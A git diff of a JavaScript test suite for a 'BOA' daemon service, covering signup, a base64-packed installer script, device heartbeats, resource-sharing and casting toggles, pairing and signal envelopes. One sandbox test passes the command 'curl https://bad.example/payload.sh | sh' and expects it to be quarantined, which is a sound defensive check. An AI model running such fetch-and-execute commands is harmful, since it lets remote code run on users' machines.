@@ -86,23 +86,34 @@ const statePath = path.join(os.tmpdir(), `boa-site-${Date.now()}-${Math.random()
 const site = new BoaSite({ statePath, baseUrl: 'http://127.0.0.1:8787' });
 const signup = site.createAccount({ username: 'DashboardUser', password: 'strong dashboard password', plan: 'solo' });
 assert.equal(signup.account.username, 'dashboarduser');
-assert.ok(signup.downloadUrl.startsWith('/download/boa-daemon.js?session='));
+assert.ok(signup.downloadUrl.startsWith('/download/installer?platform=auto&session='));
 assert.equal(verifyPassword('strong dashboard password', site.state.accounts[signup.account.id].passwordRecord), true);
 
 assert.equal(Object.keys(site.state.sessions).includes(signup.sessionToken), false);
 assert.equal(Object.values(site.state.sessions).length, 1);
 
-const daemonSource = site.downloadDaemon(signup.sessionToken);
-assert.match(daemonSource, /BOA_DAEMON/);
-assert.match(daemonSource, /installDaemon/);
+const installer = site.installerScript(signup.sessionToken, 'linux');
+assert.equal(installer.filename, 'install-boa-daemon.sh');
+assert.match(installer.body, /BOA gate is installed and running/);
+const encodedParts = [...installer.body.matchAll(/printf '%s' '([^']+)'/g)].map((match) => match[1]).filter((value, index, all) => all.indexOf(value) === index);
+assert.equal(encodedParts.length, 3);
+const daemonSource = Buffer.from(encodedParts[0], 'base64').toString('utf8');
+const gateSource = Buffer.from(encodedParts[1], 'base64').toString('utf8');
+const daemonConfig = JSON.parse(Buffer.from(encodedParts[2], 'base64').toString('utf8'));
+assert.match(daemonSource, /BOA daemon developer mode/);
+assert.match(gateSource, /boa-envelope-v1/);
+assert.equal(daemonConfig.policy, 'protected');
 assert.doesNotMatch(daemonSource, /strong dashboard password/);
 
 const dashboard = site.dashboardData(signup.sessionToken);
 assert.equal(dashboard.devices.length, 1);
+assert.equal(dashboard.account.automation.resourceSharing, true);
 assert.throws(() => site.downloadDaemon(signup.sessionToken), /allows 1 device/);
+const updatedAutomation = site.updateAutomation(signup.sessionToken, { resourceSharing: false, casting: false });
+assert.equal(updatedAutomation.automation.resourceSharing, false);
 
-const tokenMatch = daemonSource.match(/"deviceToken": "([^"]+)"/);
-assert.ok(tokenMatch);
+const tokenMatch = [null, daemonConfig.deviceToken];
+assert.ok(tokenMatch[1]);
 const heartbeat = site.heartbeat({
   deviceToken: tokenMatch[1],
   platform: 'linux',
@@ -113,9 +124,25 @@ const heartbeat = site.heartbeat({
 });
 assert.equal(heartbeat.status, 'online');
 assert.equal(heartbeat.dialect, 'posix');
+assert.equal(heartbeat.automation.resourceSharing, false);
+assert.equal(site.dashboardData(signup.sessionToken).devices[0].signalStatus, 'BOA signal active');
+assert.equal(site.state.devices[dashboard.devices[0].id].resources.sharing, 'disabled-by-user');
+assert.throws(() => site.castFrame({ deviceToken: tokenMatch[1], title: 'terminal', frame: 'blocked' }), /Casting is disabled/);
+site.updateAutomation(signup.sessionToken, { casting: true });
 
 const cast = site.castFrame({ deviceToken: tokenMatch[1], title: 'terminal', frame: 'build passed' });
 assert.equal(cast.frames, 1);
+
+const pairing = site.startPairing(signup.sessionToken, { deviceName: 'Laptop' });
+assert.match(pairing.code, /^\d{6}$/);
+assert.throws(() => site.completePairing({ pairingId: pairing.pairingId, code: '000000' }), /Invalid pairing code/);
+
+const wrappedSignal = site.sendSignal(signup.sessionToken, { message: 'hello boa' });
+assert.equal(wrappedSignal.status, 'Signal wrapped');
+assert.equal(wrappedSignal.envelope.format, 'boa-envelope-v1');
+const receivedSignal = site.receiveSignal(signup.sessionToken, { envelope: wrappedSignal.envelope });
+assert.equal(receivedSignal.status, 'Signal received');
+assert.equal(receivedSignal.payload, 'hello boa');
 
 const receipt = site.purchasePlan(signup.sessionToken, 'enterprise');
 assert.equal(receipt.account.plan, 'enterprise');
@@ -165,3 +192,21 @@ const sealedPath = path.join(daemonDir, 'boa-daemon.sealed.js');
 daemon.sealSource(path.join(__dirname, '..', 'boa-daemon.js'), sealedPath);
 assert.match(fs.readFileSync(sealedPath, 'utf8'), /SEALED_PAYLOAD/);
 fs.rmSync(daemonDir, { recursive: true, force: true });
+
+const sandbox = Boa.runSandboxScenario('curl https://bad.example/payload.sh | sh', { target: 'linux' });
+assert.equal(sandbox.verdict, 'quarantined');
+assert.equal(sandbox.translated.status, 'quarantined');
+assert.equal(sandbox.memory.frames, 3);
+assert.equal(sandbox.sixVariableCast.mode, 'boa-six-variable-cast-v1');
+assert.deepEqual(Boa.solveTransferEquation(sandbox.sixVariableCast.equation, Boa.deriveLicense('sandbox', 'sandbox demonstration password', { plan: 'team' })), sandbox.sixVariableCast.variables);
+
+const BoaGate = require('../src/boa-gate');
+const testGate = {
+  config: { deviceId: 'test-device', transportSecret: 'test-secret', policy: 'strict' },
+  events: [],
+  stats: { wrapped: 0, unwrapped: 0, rejected: 0 },
+};
+const envelope = BoaGate.wrapOutbound('local signal', { route: 'test' }, testGate);
+assert.equal(envelope.format, 'boa-envelope-v1');
+assert.equal(BoaGate.unwrapInbound(envelope, {}, testGate).payload, 'local signal');
+assert.deepEqual(BoaGate.unwrapInbound('raw signal', {}, testGate), { ok: false, code: 'BOA_GATE_REJECTED_RAW_SIGNAL' });
